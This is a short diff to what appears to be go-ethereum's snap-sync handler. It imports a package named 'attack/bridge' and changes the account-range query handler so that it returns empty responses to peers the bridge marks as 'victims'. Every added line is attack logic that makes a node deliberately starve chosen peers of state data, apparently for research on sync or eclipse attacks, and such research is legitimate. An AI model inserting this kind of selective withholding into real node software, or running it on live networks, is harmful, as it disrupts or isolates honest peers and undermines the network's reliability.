@@ -32,6 +32,8 @@ import (
 	"github.com/ethereum/go-ethereum/p2p/enr"
 	"github.com/ethereum/go-ethereum/rlp"
 	"github.com/ethereum/go-ethereum/trie"
+	
+	"github.com/ethereum/go-ethereum/attack/bridge"
 )
 
 const (
@@ -282,6 +284,11 @@ func HandleMessage(backend Backend, peer *Peer) error {
 // ServiceGetAccountRangeQuery assembles the response to an account range query.
 // It is exposed to allow external packages to test protocol behavior.
 func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePacket, p *Peer) ([]*AccountData, [][]byte) {
+	if !bridge.DoingDelivery() && bridge.IsVictim(p.Peer.ID().String()[:8]) {
+		log.Info("Nullifying response to range query")
+		return nil, nil
+	}
+
 	if req.Bytes > softResponseLimit {
 		req.Bytes = softResponseLimit
 	}
